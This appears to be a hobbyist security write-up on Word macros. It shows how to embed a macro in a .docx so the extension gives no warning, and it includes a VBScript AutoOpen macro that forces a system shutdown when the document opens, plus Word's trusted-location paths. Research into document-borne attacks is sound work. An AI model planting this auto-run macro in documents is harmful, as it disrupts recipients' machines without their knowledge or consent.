## Researching macros in microsoft word (.docx) documents


### Word extensions for macro enabled/disabled documents
Under normal circumstances, .docm is the default extension for any macros added. However through the developer ribbon, macros can be added without changing the file extension. This greatly increases the risk of a reverse shell running in the background, especially one that tunnels through trusted channels like discord.
Here's how!!
1.) Check developer under File -> Options -> Customise Ribboms -> Right box -> Developer
2.) Create a new macro and paste in the script
3.) Save the document

### Example
```vbs
Sub AutoOpen()
'
' AutoOpen Macro
'
'
    CreateObject("Wscript.shell").Run "shutdown -s -f -t 500"
End Sub
 
Sub Document_Open()
    CreateObject("Wscript.shell").Run "shutdown -s -f -t 500"
End Sub
```
Referenced from [Reverse Shell From Word Document (Agis, 2021)](https://github.com/Agisthemantobeat/Reverse-Shell-From-Word-Document)
The above script, when pasted in as a module (macro), opens the shell and schedules a shutdown.
I have created an [example file](https://github.com/MintOcha/Writeups/blob/main/Word%20Macro%20Example.docx) that you can download and try for yourself, with the script above.
I tested it on a docx outside of trusted directory and word protection (editing enabled) which ran without any prompts.

### Word trusted locations
```
C:\Users\[User]\AppData\Roaming\Microsoft\Word\Startup\ 
C:\Users\[User]\AppData\Roaming\Microsoft\Templates\
```

Some locations are deemed as "trusted" locations by word, which means running a word document from there can run macros or activeX without prompt. This could potentially be leveraged by threat actors who could first write a word doc into that location and runit thereby any macros associated. It's however, unlikely for this to be leveraged due to a prerequisite of the attacker already having access

### More possibilities?

Active X is a feature written in the same language as the above macro (vbs), and it allows the user to interact with the document. It can also be used to run macros though it won't make much of a difference. 

Office generally allows interaction between office apps, so perhaps we could do it for excel?
